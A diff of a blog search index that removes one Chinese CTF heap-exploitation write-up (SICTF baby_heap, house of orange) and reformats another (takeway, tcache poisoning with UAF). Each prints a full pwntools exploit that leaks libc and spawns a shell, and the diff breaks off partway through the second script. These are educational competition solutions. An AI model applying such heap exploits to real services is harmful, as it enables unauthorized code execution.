@@ -1,160 +1,118 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2023SICTF-Pwn-baby_heap-wp</title>
-    <url>/2023/09/22/2023SICTF-Pwn-baby_heap-wp/</url>
-    <content><![CDATA[<p><blockquote class="blockquote-center">
-baby一点都不baby...houseoforange+unsortedbinattack
-</blockquote><br><span id="more"></span></p>
-<h1 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00  逆向分析"></a>0x00  逆向分析</h1><ol>
-<li>main函数很简单，1申请2编辑3打印，但是没有free，google’no free pwn’了解到有可能是houseoforange</li>
-<li>add函数，两个约束（1. 最多申请32个chunk 2. chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin attack或者unsortedbin attack来打（但这里没有free，就导致fastbin很难利用）<br><img src="/pic/Pasted image 20230922101040.png" alt=""></li>
-<li>edit函数<br><img src="/pic/Pasted image 20230922101820.png" alt=""></li>
-<li>show函数，只打印了8个字节就很难受<br><img src="/pic/Pasted image 20230922101901.png" alt=""></li>
-</ol>
-<h1 id="0x01-思路分析"><a href="#0x01-思路分析" class="headerlink" title="0x01  思路分析"></a>0x01  思路分析</h1><ol>
-<li>我们肯定是要实现“leak libc”和“Any Address Write”<ol>
-<li>leak libc<ol>
-<li>思路1：unsortedbin leak<ol>
-<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
-</ol>
-</li>
-<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
-</ol>
-</li>
-<li>Any Address Write<ol>
-<li>思路1：常规unsortedbin attack<ol>
-<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
-</ol>
-</li>
-<li>思路2：unsortedbin 申请 fake_chunk<ol>
-<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>将写入的got表改写为og即可提权</li>
-</ol>
-<h1 id="0x02-具体步骤"><a href="#0x02-具体步骤" class="headerlink" title="0x02  具体步骤"></a>0x02  具体步骤</h1><ol>
-<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line">  </span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br></pre></td></tr></table></figure></li>
-<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br></pre></td></tr></table></figure></li>
-<li>伪造victim.bk = 0x4040c8（fake_chunk_head）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br></pre></td></tr></table></figure></li>
-<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br></pre></td></tr></table></figure></li>
-<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h1 id="0x03-一些问题"><a href="#0x03-一些问题" class="headerlink" title="0x03  一些问题"></a>0x03  一些问题</h1><p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br>Q2： 我感觉申请8个chunk就够了…把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
-<h1 id="0x04-完整EXP"><a href="#0x04-完整EXP" class="headerlink" title="0x04  完整EXP"></a>0x04  完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">file = &#x27;./baby_heap&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./baby_heap&#x27;)</span><br><span class="line">libc = ELF(&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line"></span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-        <tag>Heap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
     <url>/2023/08/26/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
 学艺不精...对于"读/写函数对指针的利用"没那么敏感（
 </blockquote>
-
 <span id="more"></span>
-<h1 id="0xff-说在前面"><a href="#0xff-说在前面" class="headerlink" title="0xff 说在前面"></a>0xff 说在前面</h1><p>下文EXP中，leak堆地址的部分需要”伪爆破”，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行<br><a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令: 7c9pe6</p>
-<h1 id="0x00-Exploitations"><a href="#0x00-Exploitations" class="headerlink" title="0x00 Exploitations"></a>0x00 Exploitations</h1><ol>
-<li>tcachebin libc2.31 <ol>
+<h1 id="xff-说在前面">0xff 说在前面</h1>
+<p>下文EXP中，leak堆地址的部分需要"伪爆破"，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行
+<a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令:
+7c9pe6</p>
+<h1 id="x00-exploitations">0x00 Exploitations</h1>
+<ol type="1">
+<li>tcachebin libc2.31
+<ol type="1">
 <li>tcachebin poisoning</li>
-<li>版本判断<ol>
+<li>版本判断
+<ol type="1">
 <li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
 <li>tcache有doublefree检测，则是2.28以上</li>
 <li>有tcache，则是2.26以上</li>
-</ol>
-</li>
-</ol>
-</li>
+</ol></li>
+</ol></li>
 <li>UAF</li>
 <li>利用题目提供的堆表+puts/read进行任意地址读写</li>
 </ol>
-<h1 id="0x01-反汇编修改"><a href="#0x01-反汇编修改" class="headerlink" title="0x01  反汇编修改"></a>0x01  反汇编修改</h1><pre><code>    首先进行一个反汇编的读   
-</code></pre><blockquote>
+<h1 id="x01-反汇编修改">0x01 反汇编修改</h1>
+<pre><code>    首先进行一个反汇编的读   </code></pre>
+<blockquote>
 <p>trick: IDA中对变量按Y键可以改变变量类型</p>
 </blockquote>
-<p><img src="/pic/Pasted image 20230826230935.png" alt=""><br>alloc: strcspn是从字符串中返回不含“所查找字符”的子字符串的长度<br><img src="/pic/Pasted image 20230826231015.png" alt=""><br>delete: 指针未置零，一眼UAF<br><img src="/pic/Pasted image 20230826231112.png" alt=""><br>modify<br><img src="/pic/Pasted image 20230826231127.png" alt=""></p>
-<h1 id="0x02-分析与思路构造"><a href="#0x02-分析与思路构造" class="headerlink" title="0x02  分析与思路构造"></a>0x02  分析与思路构造</h1><blockquote>
-<p>分析部分  </p>
+<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
+strcspn是从字符串中返回不含“所查找字符”的子字符串的长度 <img
+src="/pic/Pasted%20image%2020230826231015.png" /> delete:
+指针未置零，一眼UAF <img
+src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
+src="/pic/Pasted%20image%2020230826231127.png" /></p>
+<h1 id="x02-分析与思路构造">0x02 分析与思路构造</h1>
+<blockquote>
+<p>分析部分</p>
 </blockquote>
-<ol>
-<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28<ol>
+<ol type="1">
+<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28
+<ol type="1">
 <li>没办法直接用unsortedbin leak libc</li>
 <li>不能通过填满tcachebin来绕过tcache机制</li>
-<li>tcachebins poisoning<ol>
+<li>tcachebins poisoning
+<ol type="1">
 <li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
 <li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>分析modify: 有puts/read<ol>
-<li>可能通过puts”直到遇到换行符才停止输出”的原理来泄露什么东西</li>
-</ol>
-</li>
-<li>分析delete<ol>
+</ol></li>
+</ol></li>
+<li>分析modify: 有puts/read
+<ol type="1">
+<li>可能通过puts"直到遇到换行符才停止输出"的原理来泄露什么东西</li>
+</ol></li>
+<li>分析delete
+<ol type="1">
 <li>UAF</li>
-</ol>
-</li>
-<li>远程测试libc版本<ol>
+</ol></li>
+<li>远程测试libc版本
+<ol type="1">
 <li>doubleFree有限制，2.28以上</li>
 <li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
-</ol>
-</li>
+</ol></li>
 </ol>
 <blockquote>
-<p> 思路构造部分</p>
+<p>思路构造部分</p>
 </blockquote>
-<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。<br>后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（<br>打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
-<p>综上，思路为：  </p>
-<ol>
-<li>利用tcachebin的bk泄露堆地址</li>
-<li>在heapList伪造chunk，修改chunk0_ptr为”puts_got-8”</li>
-<li>puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址</li>
-<li>通过gdb发现”puts_got-8”正好是”free_got”</li>
-<li>而read函数正好是修改”puts_got-8”指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr</li>
-<li>由于chunk0_ptr, chunk1_ptr均被修改，所以我们要找”ptr没有被修改”&amp;”chunk没有被free过”的chunk2存一下/bin/sh</li>
-<li>free chunk2 —&gt; getshell！<h1 id="0x03-分步解题"><a href="#0x03-分步解题" class="headerlink" title="0x03  分步解题"></a>0x03  分步解题</h1></li>
-<li><p>patchelf，根据远程调试选择了libc2.31</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>利用tcachebin的bk泄露堆地址<br>可以看到bk是指向tcachebin_entries[3]的<br><img src="/pic/Pasted image 20230827001916.png" alt=""></p>
+<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin
+poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。<br />
+后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted
+bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak
+libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（
+打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
+<p>综上，思路为：<br />
+1. 利用tcachebin的bk泄露堆地址 2.
+在heapList伪造chunk，修改chunk0_ptr为"puts_got-8" 3.
+puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址 4.
+通过gdb发现"puts_got-8"正好是"free_got" 5.
+而read函数正好是修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
+6. 由于chunk0_ptr,
+chunk1_ptr均被修改，所以我们要找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh
+7. free chunk2 --&gt; getshell！ # 0x03 分步解题 1.
+patchelf，根据远程调试选择了libc2.31 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure></p>
+<ol start="2" type="1">
+<li>利用tcachebin的bk泄露堆地址 可以看到bk是指向tcachebin_entries[3]的
+<img src="/pic/Pasted%20image%2020230827001916.png" />
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)     # 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span><br><span class="line">delete(0)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;)) # 注：这里我没想到更好的方法，heap_addr有可能是三字节</span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br></pre></td></tr></table></figure></li>
-<li>通过tcache poisoning在heapList段伪造chunk2，<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(1)                        # 把上一步申请的chunk1放进tcachebin</span><br><span class="line"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span><br><span class="line">payload = p64(heap_addr + 0x290) # 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span><br><span class="line">fill(1,payload)                  </span><br><span class="line">alloc(2,payload1,payload2)       # 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span><br></pre></td></tr></table></figure></li>
-<li>申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误: 下图“加上下一个chunk的prev_size构成了chunk2”中的”chunk2”应为chunk3）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br></pre></td></tr></table></figure>
-<img src="/pic/Pasted image 20230827003153.png" alt=""><br>读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts  </li>
-<li>修改”puts_got-8”指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br></pre></td></tr></table></figure></li>
-<li>找”ptr没有被修改”&amp;”chunk没有被free过”的chunk2存一下/bin/sh然后free掉他，getshell！<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>
+<li>通过tcache poisoning在heapList段伪造chunk2， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(1)                        # 把上一步申请的chunk1放进tcachebin</span><br><span class="line"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span><br><span class="line">payload = p64(heap_addr + 0x290) # 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span><br><span class="line">fill(1,payload)                  </span><br><span class="line">alloc(2,payload1,payload2)       # 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span><br></pre></td></tr></table></figure></li>
+<li>申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误:
+下图“加上下一个chunk的prev_size构成了chunk2”中的"chunk2"应为chunk3）
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
+读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts<br />
 </li>
+<li>修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br></pre></td></tr></table></figure></li>
+<li>找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh然后free掉他，getshell！
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="0x04-完整EXP"><a href="#0x04-完整EXP" class="headerlink" title="0x04  完整EXP"></a>0x04  完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;101.200.234.115&#x27;</span><br><span class="line">port = 42490</span><br><span class="line">file = &#x27;./takeway&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./takeway&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,name,remark):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index&#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name: &#x27;, name)</span><br><span class="line">  io.sendafter(&#x27;remark: &#x27;, remark)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def fill(index,name):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name is: &#x27;, name)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload1 = &#x27;\x00&#x27;</span><br><span class="line">payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)</span><br><span class="line">delete(0)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">delete(1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = p64(heap_addr + 0x290)</span><br><span class="line">fill(1,payload)</span><br><span class="line">alloc(2,payload1,payload2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><p>这题太遗憾了…最后也没做出来。不过做一窍不通的题收获才最大。<br>做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br>对tcachebin的第一印象如下:      </p>
-<ol>
-<li>概述  <ol>
-<li>0x10~0x410（貌似是）的chunk</li>
-<li>LIFO</li>
-<li>大小只有7，free满以后再free就会放到对应的其他bin中</li>
-<li>2.28及以下的libc不检测double free</li>
-</ol>
-</li>
-<li>伪造chunk<ol>
-<li>安全性比fastbin还差，不检验fd指向chunk的size直接申请</li>
-</ol>
-</li>
-<li>leak堆地址<ol>
-<li>2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry<br>目前就想到这些，这次多亏队友带飞，进半决赛了XD</li>
-</ol>
-</li>
-</ol>
+<h1 id="x04-完整exp">0x04 完整EXP</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;101.200.234.115&#x27;</span><br><span class="line">port = 42490</span><br><span class="line">file = &#x27;./takeway&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./takeway&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,name,remark):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index&#x27;, str(index))</span><br><span class="line">  